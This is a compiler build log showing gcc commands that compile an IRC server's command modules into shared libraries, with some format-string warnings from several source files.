gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svssilence.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sendsno.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svssno.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sajoin.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sapart.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_samode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_kick.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_topic.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_invite.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_list.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_time.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svskill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sjoin.c

m_sjoin.c: In function ‘m_sjoin’:

m_sjoin.c:959: warning: unknown conversion type character ‘B’ in format

m_sjoin.c:959: warning: format ‘%s’ expects type ‘char *’, but argument 7 has type ‘time_t’

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_pass.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_userhost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_ison.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_silence.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_knock.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_umode2.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_squit.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_protoctl.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_addline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_addmotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_addomotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_wallops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_admin.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_globops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_locops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_chatops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_trace.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_netinfo.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_links.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_help.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_rules.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_close.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_map.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_eos.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_server.c

m_server.c: In function ‘m_server_synch’:

m_server.c:837: warning: unknown conversion type character ‘B’ in format

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 6 has type ‘time_t’

m_server.c:837: warning: unknown conversion type character ‘b’ in format

m_server.c:837: warning: format ‘%lu’ expects type ‘long unsigned int’, but argument 8 has type ‘char *’

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 9 has type ‘long int’

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 10 has type ‘long unsigned int’

m_server.c:837: warning: unknown conversion type character ‘b’ in format

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 10 has type ‘long unsigned int’

m_server.c:860: warning: unknown conversion type character ‘B’ in format

m_server.c:860: warning: format ‘%s’ expects type ‘char *’, but argument 6 has type ‘time_t’

m_server.c:860: warning: format ‘%lu’ expects type ‘long unsigned int’, but argument 9 has type ‘char *’

m_server.c:860: warning: format ‘%s’ expects type ‘char *’, but argument 10 has type ‘long unsigned int’

m_server.c:923: warning: unknown conversion type character ‘B’ in format

m_server.c:923: warning: format ‘%s’ expects type ‘char *’, but argument 6 has type ‘time_t’

m_server.c: In function ‘send_channel_modes_sjoin3’:

m_server.c:1398: warning: unknown conversion type character ‘B’ in format

m_server.c:1398: warning: format ‘%s’ expects type ‘char *’, but argument 4 has type ‘time_t’

m_server.c:1405: warning: unknown conversion type character ‘B’ in format

m_server.c:1405: warning: format ‘%s’ expects type ‘char *’, but argument 4 has type ‘time_t’

m_server.c:1412: warning: unknown conversion type character ‘B’ in format

m_server.c:1412: warning: format ‘%s’ expects type ‘char *’, but argument 4 has type ‘time_t’

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_stats.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svsfline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_dccdeny.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_undccdeny.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_whowas.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_connect.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_dccallow.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_userip.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_nick.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_user.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_mode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_watch.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_part.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_join.c

m_join.c: In function ‘_join_channel’:

m_join.c:381: warning: unknown conversion type character ‘B’ in format

m_join.c:381: warning: format ‘%s’ expects type ‘char *’, but argument 7 has type ‘time_t’

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_motd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_opermotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_botmotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_lusers.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_names.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -o commands.so l_commands.c \

	m_sethost.o m_chghost.o m_chgident.o m_setname.o m_setident.o m_sdesc.o m_svsmode.o m_swhois.o m_svsmotd.o m_svsnline.o m_who.o m_mkpasswd.o m_away.o m_svsnoop.o m_svso.o m_svsnick.o m_adminchat.o m_akill.o m_chgname.o m_guest.o m_htm.o m_kill.o m_lag.o m_message.o webtv.o m_nachat.o m_oper.o m_pingpong.o m_quit.o m_rakill.o m_rping.o m_sendumode.o m_sqline.o m_tsctl.o m_unkline.o m_unsqline.o m_unzline.o m_whois.o m_tkl.o m_vhost.o m_cycle.o m_svsjoin.o m_svspart.o m_svslusers.o m_svswatch.o m_svssilence.o m_sendsno.o m_svssno.o m_sajoin.o m_sapart.o m_samode.o m_kick.o m_topic.o m_invite.o m_list.o m_time.o m_svskill.o m_sjoin.o m_pass.o m_userhost.o m_ison.o m_silence.o m_knock.o m_umode2.o m_squit.o m_protoctl.o m_addline.o m_addmotd.o m_addomotd.o m_wallops.o m_admin.o m_globops.o m_locops.o m_chatops.o m_trace.o m_netinfo.o m_links.o m_help.o m_rules.o m_close.o m_map.o m_eos.o m_server.o m_stats.o m_svsfline.o m_dccdeny.o m_undccdeny.o m_whowas.o m_connect.o m_dccallow.o m_userip.o m_nick.o m_user.o m_mode.o m_watch.o m_part.o m_join.o m_motd.o m_opermotd.o m_botmotd.o m_lusers.o m_names.o

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_sethost.so m_sethost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_chghost.so m_chghost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_chgident.so m_chgident.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_setname.so m_setname.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_setident.so m_setident.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_sdesc.so m_sdesc.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_svsmode.so m_svsmode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_swhois.so m_swhois.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_svsmotd.so m_svsmotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_svsnline.so m_svsnline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		 -o m_who.so m_who.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_mkpasswd.so m_mkpasswd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_away.so m_away.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svsnoop.so m_svsnoop.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svso.so m_svso.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svsnick.so m_svsnick.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_adminchat.so m_adminchat.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_akill.so m_akill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_chgname.so m_chgname.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_guest.so m_guest.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_htm.so m_htm.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_kill.so m_kill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_lag.so m_lag.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_message.so m_message.c webtv.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_nachat.so m_nachat.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_oper.so m_oper.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_pingpong.so m_pingpong.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_quit.so m_quit.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_rakill.so m_rakill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_rping.so m_rping.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_sendumode.so m_sendumode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_sqline.so m_sqline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_tsctl.so m_tsctl.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_unkline.so m_unkline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_unsqline.so m_unsqline.c

